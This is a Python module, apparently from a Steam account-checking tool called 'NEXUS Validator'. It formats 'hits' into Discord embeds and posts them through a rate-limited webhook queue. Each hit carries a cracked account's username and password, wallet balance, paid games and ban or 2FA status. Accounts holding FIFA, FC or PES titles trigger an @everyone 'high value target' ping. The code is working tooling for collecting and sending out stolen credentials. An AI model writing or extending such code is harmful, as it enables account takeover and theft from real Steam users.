"""
Asynchronous Discord Webhook Dispatcher and Alert Sink
Provides rate-limited background queuing, rich embed generation,
instant hit telemetry reporting, and connection testing.
"""

import time
import asyncio
import logging
from typing import Dict, Any, Optional, List
from datetime import datetime
import aiohttp

logger = logging.getLogger(__name__)

DEFAULT_STEAM_ICON = "https://community.cloudflare.steamstatic.com/public/shared/images/responsive/share_steam_logo.png"


def build_discord_embed(item: Dict[str, Any]) -> Dict[str, Any]:
    """
    Constructs a rich, formatted Discord embed from a verified account record.
    Shows ALL paid games, account value, and security status clearly.
    """
    username  = item.get("username", "Unknown")
    password  = item.get("password", "")
    status    = item.get("status", "HIT")
    steamid   = str(item.get("steamid", "")).strip()
    persona   = item.get("persona_name", username) or username
    total_games = item.get("total_games", 0)
    paid_games  = item.get("paid_games", 0)
    wallet    = item.get("wallet", "")
    country   = item.get("country", "Global")
    location  = item.get("location", "")
    vac_banned = item.get("vac_banned", False)
    trade_banned = item.get("trade_banned", False)
    is_limited = item.get("is_limited", False)
    avatar_url = item.get("avatar_url", "") or DEFAULT_STEAM_ICON
    games = item.get("games", [])
    matched_targets = item.get("matched_targets", [])
    is_2fa = (status == "2FA_HIT")

    # Separate paid and free games
    paid_game_list = [
        g for g in games
        if not g.get("is_free", False) and g.get("name") and not g.get("name","").startswith("AppID ")
    ]
    free_game_list = [
        g for g in games
        if g.get("is_free", False) and g.get("name") and not g.get("name","").startswith("AppID ")
    ]

    # Color + title based on account type
    if matched_targets and not is_2fa:
        color = 0xFF0055   # Hot red for target hit
        title_prefix = "[TARGET HIT]"
    elif is_2fa:
        color = 0xFFAB00   # Amber for 2FA
        title_prefix = "[2FA LOCKED]"
    elif paid_game_list:
        color = 0x00E676   # Emerald for paid hit
        title_prefix = "[HIT - PAID GAMES]"
    else:
        color = 0x00B0FF   # Blue for free/empty
        title_prefix = "[HIT - FREE ONLY]"

    profile_link = f"https://steamcommunity.com/profiles/{steamid}" if steamid else None
    title = f"{title_prefix}  {persona}"

    fields: List[Dict[str, Any]] = []

    # ── Target games banner ──────────────────────────────────────────────────
    if matched_targets:
        tlines = []
        for tg in matched_targets[:15]:
            name = tg.get("name") if isinstance(tg, dict) else str(tg)
            hours = tg.get("hours","0") if isinstance(tg,dict) else "0"
            h = f" ({hours}h)" if hours and str(hours) != "0" else ""
            tlines.append(f"**{name}**{h}")
        if len(matched_targets) > 15:
            tlines.append(f"*+{len(matched_targets)-15} more...*")
        fields.append({
            "name": f"HEDEF OYUNLAR ({len(matched_targets)})",
            "value": "\n".join(tlines) or "—",
            "inline": False
        })

    # ── Account credentials ──────────────────────────────────────────────────
    fields.append({
        "name": "Hesap",
        "value": f"`{username}` : ||`{password}`||",
        "inline": True
    })

    # SteamID
    sid_val = f"[{steamid}]({profile_link})" if steamid and profile_link else (steamid or "N/A")
    fields.append({"name": "SteamID", "value": sid_val, "inline": True})

    # Wallet
    fields.append({
        "name": "Bakiye",
        "value": f"`{wallet}`" if wallet else "`$0 / Yok`",
        "inline": True
    })

    # Game count
    fields.append({
        "name": "Oyun Sayisi",
        "value": f"**{total_games}** toplam | **{paid_games}** ucretli | **{len(free_game_list)}** ucretsiz",
        "inline": True
    })

    # Country
    loc = f" ({location})" if location else ""
    fields.append({"name": "Ulke", "value": f"{country}{loc}", "inline": True})

    # Security
    vac_str   = "BANLI" if vac_banned   else "Temiz"
    trade_str = "BANLI" if trade_banned else "Temiz"
    limit_str = "Sinirli" if is_limited else "Normal"
    fields.append({
        "name": "Guvenlik",
        "value": f"VAC: **{vac_str}** | Trade: **{trade_str}** | Hesap: {limit_str}",
        "inline": True
    })

    # ── Paid games field (most important) ────────────────────────────────────
    if paid_game_list:
        plines = []
        for g in paid_game_list[:20]:
            nm = g.get("name","?")
            h  = g.get("hours","0")
            h_str = f" ({h}h)" if h and str(h) != "0" else ""
            plines.append(f"• {nm}{h_str}")
        if len(paid_game_list) > 20:
            plines.append(f"*... ve {len(paid_game_list)-20} ucretli oyun daha*")
        val = "\n".join(plines)
        if len(val) > 1020:
            val = val[:1015] + "..."
        fields.append({
            "name": f"UCRETLI OYUNLAR ({len(paid_game_list)})",
            "value": val,
            "inline": False
        })
    elif is_2fa:
        fields.append({
            "name": "Oyunlar",
            "value": "*(Steam Guard aktif - oyun listesi alinamadi)*",
            "inline": False
        })
    else:
        fields.append({
            "name": "Oyunlar",
            "value": "*(Ucretsiz hesap veya oyun yok)*",
            "inline": False
        })

    # ── Free games (compact, max 10) ─────────────────────────────────────────
    if free_game_list:
        fnames = ", ".join(g.get("name","?") for g in free_game_list[:10])
        if len(free_game_list) > 10:
            fnames += f" +{len(free_game_list)-10} daha"
        if len(fnames) > 1020:
            fnames = fnames[:1015] + "..."
        fields.append({
            "name": f"Ucretsiz Oyunlar ({len(free_game_list)})",
            "value": fnames,
            "inline": False
        })

    embed = {
        "title": title,
        "color": color,
        "fields": fields,
        "thumbnail": {"url": avatar_url},
        "footer": {
            "text": "NEXUS Validator — Steam Hit",
            "icon_url": DEFAULT_STEAM_ICON
        },
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }
    if profile_link:
        embed["url"] = profile_link

    return embed




class DiscordWebhookDispatcher:
    """
    Thread-safe and async-safe rate-limited Discord Webhook dispatcher.
    Queues messages and delivers them with automatic exponential backoff upon HTTP 429.
    """

    def __init__(self, webhook_url: str):
        self.webhook_url = webhook_url.strip()
        self._queue: Optional[asyncio.Queue] = None
        self._worker_task: Optional[asyncio.Task] = None
        self._is_running = False
        self._session: Optional[aiohttp.ClientSession] = None

    async def start(self):
        """Starts background dispatch worker."""
        if self._is_running:
            return
        self._queue = asyncio.Queue(maxsize=5000)
        self._is_running = True
        self._worker_task = asyncio.create_task(self._dispatch_loop())

    async def stop(self):
        """Drains remaining queue and terminates dispatcher."""
        self._is_running = False
        if self._worker_task:
            self._worker_task.cancel()
            try:
                await self._worker_task
            except asyncio.CancelledError:
                pass
        if self._session and not self._session.closed:
            await self._session.close()

    async def dispatch_hit(self, item: Dict[str, Any]):
        """Non-blocking dispatch of a verified hit item into the transmission queue."""
        if not self.webhook_url:
            return

        if not self._is_running or not self._queue:
            await self.start()

        try:
            embed = build_discord_embed(item)
            payload = {
                "username": "NEXUS State Validator",
                "avatar_url": DEFAULT_STEAM_ICON,
                "embeds": [embed]
            }

            # Check if any matched game or library game is from FIFA, FC, or PES franchise
            matched_targets = item.get("matched_targets", [])
            all_games = item.get("games", [])
            is_football_target = False
            for tg in list(matched_targets) + list(all_games):
                g_name = (tg.get("name") if isinstance(tg, dict) else str(tg)).lower()
                if any(k in g_name for k in ("fifa", "fc 24", "fc 25", "fc 26", "ea sports fc", "pes", "pro evolution soccer", "efootball")):
                    is_football_target = True
                    break

            if is_football_target:
                payload["content"] = "@everyone 🚨 **HIGH VALUE FOOTBALL TARGET HIT (FIFA / FC / PES)** 🚨"

            if self._queue:
                await self._queue.put(payload)
                print(f"[DISCORD DISPATCH] Enqueued hit: {item.get('username')} (Football Target: {is_football_target})")
        except Exception as e:
            print(f"[DISCORD ERROR] Failed to enqueue Discord hit: {e}")
            logger.debug(f"Failed to enqueue Discord hit: {e}")

    async def dispatch_system_message(
        self,
        title: str,
        description: str,
        color: int = 0x00B0FF,
        fields: Optional[List[Dict[str, Any]]] = None,
        mention_everyone: bool = False
    ):
        """
        Sends a system-level notification embed to Discord (e.g. cycle complete, restarting).
        Non-blocking — queued like hit dispatches.
        """
        if not self.webhook_url:
            return
        if not self._is_running or not self._queue:
            await self.start()

        try:
            embed = {
                "title": title,
                "description": description,
                "color": color,
                "fields": fields or [],
                "footer": {
                    "text": "NEXUS Platform Authentication State Validator",
                    "icon_url": DEFAULT_STEAM_ICON
                },
                "timestamp": datetime.utcnow().isoformat() + "Z"
            }
            payload = {
                "username": "NEXUS State Validator",
                "avatar_url": DEFAULT_STEAM_ICON,
                "embeds": [embed]
            }
            if mention_everyone:
                payload["content"] = "@everyone"
            if self._queue:
                await self._queue.put(payload)
        except Exception as e:
            logger.debug(f"dispatch_system_message error: {e}")


    async def _dispatch_loop(self):
        """Continuous worker loop transmitting payloads with HTTP 429 rate limit respect."""
        connector = aiohttp.TCPConnector(ssl=False)
        self._session = aiohttp.ClientSession(connector=connector)

        while self._is_running:
            try:
                payload = await self._queue.get()
            except asyncio.CancelledError:
                break

            success = False
            for attempt in range(5):
                if not self._is_running:
                    break
                try:
                    async with self._session.post(
                        self.webhook_url,
                        json=payload,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        if resp.status in (200, 204):
                            success = True
                            print(f"[DISCORD DISPATCH] Successfully delivered payload to webhook (HTTP {resp.status})")
                            # Pacing delay to prevent triggering Discord rate limits (max 30 req/min)
                            await asyncio.sleep(1.2)
                            break
                        elif resp.status == 429:
                            # Discord Rate Limit Encountered
                            try:
                                rate_data = await resp.json()
                                retry_after = float(rate_data.get("retry_after", 2.0))
                            except Exception:
                                retry_after = 2.5
                            print(f"[DISCORD RATE LIMIT] Backing off for {retry_after:.2f}s...")
                            logger.info(f"Discord rate limit triggered. Backing off for {retry_after:.2f}s...")
                            await asyncio.sleep(retry_after + 0.5)
                        else:
                            resp_txt = await resp.text()
                            print(f"[DISCORD HTTP ERROR] Status {resp.status}: {resp_txt}")
                            logger.debug(f"Discord webhook error {resp.status}: {resp_txt}")
                            await asyncio.sleep(1.0)
                except asyncio.CancelledError:
                    break
                except Exception as net_err:
                    print(f"[DISCORD NET ERROR] {net_err}")
                    logger.debug(f"Discord dispatch network failure: {net_err}")
                    await asyncio.sleep(2.0)

            self._queue.task_done()


async def send_discord_test_message(webhook_url: str) -> bool:
    """Sends an instantaneous test embed to verify webhook viability."""
    if not webhook_url or not webhook_url.startswith("http"):
        return False

    test_embed = {
        "title": "⚡ NEXUS Telemetry Link Established",
        "description": "Discord notification sink successfully configured and operational.",
        "color": 0x00B0FF,
        "fields": [
            {"name": "Status", "value": "🟢 Connected", "inline": True},
            {"name": "Platform", "value": "NEXUS v1.0.0", "inline": True},
            {"name": "Target", "value": "Platform Authentication State Validator", "inline": False}
        ],
        "footer": {
            "text": "NEXUS Automated Sink Verification",
            "icon_url": DEFAULT_STEAM_ICON
        },
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }

    payload = {
        "username": "NEXUS State Validator",
        "avatar_url": DEFAULT_STEAM_ICON,
        "embeds": [test_embed]
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                webhook_url,
                json=payload,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as resp:
                return resp.status in (200, 204)
    except Exception:
        return False
